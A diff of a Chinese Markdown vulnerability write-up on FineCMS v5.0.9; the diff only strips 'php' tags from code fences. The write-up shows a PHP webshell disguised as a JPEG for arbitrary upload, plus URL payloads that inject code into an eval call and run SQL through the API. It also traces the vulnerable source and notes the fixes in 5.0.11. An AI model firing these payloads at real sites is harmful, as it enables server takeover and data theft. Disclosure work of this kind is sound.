@@ -16,7 +16,7 @@ FineCMS v5.0.9 任意文件上传&代码执行&SQL语句执行漏洞
 ### 漏洞演示
 首先注册一个用户，进入到会员中心，上传一个名为"mengchen.jpeg"的图片马，文件内容为
 
-```php
+```
 <?php phpinfo(); @eval($_POST['mengchen']);?>
 ```
 
@@ -36,7 +36,7 @@ FineCMS v5.0.9 任意文件上传&代码执行&SQL语句执行漏洞
 
 头像上传的函数在/finecms/dayrui/member/controllers/Account.php中的第177-214行
 
-```php
+```
 public function upload() {
 
     // 创建图片存储文件夹
@@ -78,7 +78,7 @@ public function upload() {
 ```
 问题主要出现在第186行的那一句正则上
 
-```php
+```
 if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result))
 ```
 
@@ -88,7 +88,7 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result))
 
 最严重的是，开发者在这里将(\w+)匹配到的字符串作为了传入文件的扩展名
 
-```php
+```
 第187行 $new_file = $dir.'0x0.'.$result[2];
 ```
 
@@ -100,7 +100,7 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result))
 
 至于路径中的uid，cookie中就有
 
-```php
+```
 $dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
 ```
 
@@ -109,7 +109,7 @@ $dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
 ### 漏洞演示
 先放上payload
 
-```php
+```
 index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=cache name=MEMBER.1'];phpinfo();$a=['1
 ```
 
@@ -121,7 +121,7 @@ index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=cache
 
 这个漏洞在/finecms/dayrui/controllers/Api.php中的data2()函数中
 
-```php
+```
 public function data2() {
 
     $data = array();
@@ -181,24 +181,24 @@ public function data2() {
 
 安全密钥在/config/system.php中第11行被定义
 
-```php
+```
 'SYS_KEY' => '24b16fede9a67c9251d3e7c7161c83ac', //安全密钥
 ```
 然后在/finecms/dayrui/config/config.php中第37行将其设置成为cookie的名字
 
-```php
+```
 $config['sess_cookie_name'] = $site['SYS_KEY'].'_ci_session';
 ```
 因此，直接在payload中使auth的值为SYS_KEY的MD5值即可。
 
 传入的param值不满足128行的条件
 ​	
-```php
+```
 if (isset($param['cache']) && $param['cache'])
 ```
 因此$data依旧为空，$param直接传入list_tag()函数中
 
-```php
+```
 $data = $this->template->list_tag($param);
 ```
 
@@ -206,7 +206,7 @@ $data = $this->template->list_tag($param);
 
 传入的数据被处理成$params，一个数组
 
-```php
+```
 Array( 
 [0] => action=cache 
 [1] => name=member.1'];phpinfo();$a=['1
@@ -214,14 +214,14 @@ Array(
 ```
 然后经过遍历处理，将两个值分别给了$system['action']和$param['name']
 
-```php
+```
 $system['action'] = cache
 $param['name'] = member.1'];phpinfo();$a=['1
 ```
 
 然后在switch-case中，进入了
 
-```php
+```
 case 'cache': // 系统缓存数据
 	if (!isset($param['name'])) {
 	    return $this->_return($system['return'], 'name参数不存在');
@@ -252,12 +252,12 @@ case 'cache': // 系统缓存数据
 ```
 代码执行的地方呢在第510行
 
-```php
+```
  @eval('$data=$cache'.$this->_get_var($_param).';');
 ```
 要想将代码执行到这儿，必须使得503-506行
 
-```php
+```
 $cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']);
 
 if (!$cache) {
@@ -266,14 +266,14 @@ return $this->_return($system['return'], "缓存({$_name})不存在，请在后�
 ```
 的$cache有值，在这
 
-```php
+```
 $_name = member
 $_param = 1'];phpinfo();$a=['1
 ```
 
 定位一下"\_cache_var()",在/finecms/dayrui/libraries/Template.php第1594-1619行
 
-```php
+```
 public function _cache_var($name, $site = SITE_ID) {
 	$data = NULL;
 	$name = strtoupper($name);
@@ -308,14 +308,14 @@ public function _cache_var($name, $site = SITE_ID) {
 
 执行到这儿,在Template.php中的$_param存在，代码执行到了
 
-```php
+```
 @eval('$data=$cache'.$this->_get_var($_param).';');
 ```
 中，定位一下"\_get_var()函数"
 
 在/finecms/dayrui/libraries/Template.php第1570行
 ​	
-```php
+```
 public function _get_var($param) {
 	$array = explode('.', $param);
 	if (!$array) {
@@ -338,18 +338,18 @@ public function _get_var($param) {
 ```
 在这个函数中，如果传入的参数$param的开头是一个$,
 
-```php
+```
 $string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
 ```
 这一条语句将会把所有的"[(任意字符)]"替换成"['1']",如果不是$开头但是字符串中有大写字母A-Z或者_,则会给字符串两边加上空格，要是条件都不满足呢，给两边都加一个单引号',最后两边分别加上[],payload最终返回的$string为
 
-```php
+```
 ['1'];phpinfo();$asd=['1']
 ```
 
 然后eval语句就成了
 
-```php
+```
 @eval(﻿$data=$cache['1'];phpinfo();$asd=['1'];)
 ```
 
@@ -361,7 +361,7 @@ $string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
 
 payload:
 
-```php
+```
 index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=sql%20sql='select%20user();'
 ```
 
@@ -374,7 +374,7 @@ index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=sql%2
 与代码执行漏洞相似，传入的参数进入data2()函数，接着传入了/finecms/dayrui/libraries/Template.php中的list_tag()函数中，经过提取action后传入switch-case语句中的sql部分(732-795行)
 
 
-```php
+```
 case 'sql': // 直接sql查询
 	if (preg_match('/sql=\'(.+)\'/sU', $_params, $sql)) {
 	    // 数据源的选择
@@ -462,20 +462,20 @@ case 'sql': // 直接sql查询
 	) 
 然后sql语句只是简单的判断了下是否为select开头(746-748行)
 ​    
-```php
+```
 	if (stripos($sql, 'SELECT') !== 0) {
 return $this->_return($system['return'], 'SQL语句只能是SELECT查询语句');
 }
 ```
 然后就进入了767行，数据查询函数中
 
-```php
+```
 $data = $this->_query($sql, $system['site'], $system['cache']);
 ```
 
 定位一下"_query()"函数，在Template.php文件的1319-1346行，
 
-```php
+```
 public function _query($sql, $site, $cache, $all = TRUE) {
 
     // 数据库对象
@@ -523,7 +523,7 @@ public function _query($sql, $site, $cache, $all = TRUE) {
 
 5.0.11版本中
 
-```php
+```
 if (!in_array(strtolower($result[2]), array('jpg', 'jpeg', 'png', 'gif'))) {
         exit(dr_json(0, '目录权限不足'));
     }
@@ -534,11 +534,11 @@ if (!in_array(strtolower($result[2]), array('jpg', 'jpeg', 'png', 'gif'))) {
 
 在5.0.11版本的finecms\dayrui\config\config.php文件中
 
-```php
+```
 $config['sess_cookie_name']	= md5(substr($site['SYS_KEY'],0, 5)).'_ci_session';
 ```
 相比较5.0.9版本直接获取SYS_KEY的值更安全了
 
-```php
+```
 $config['sess_cookie_name']	= $site['SYS_KEY'].'_ci_session';
 ```
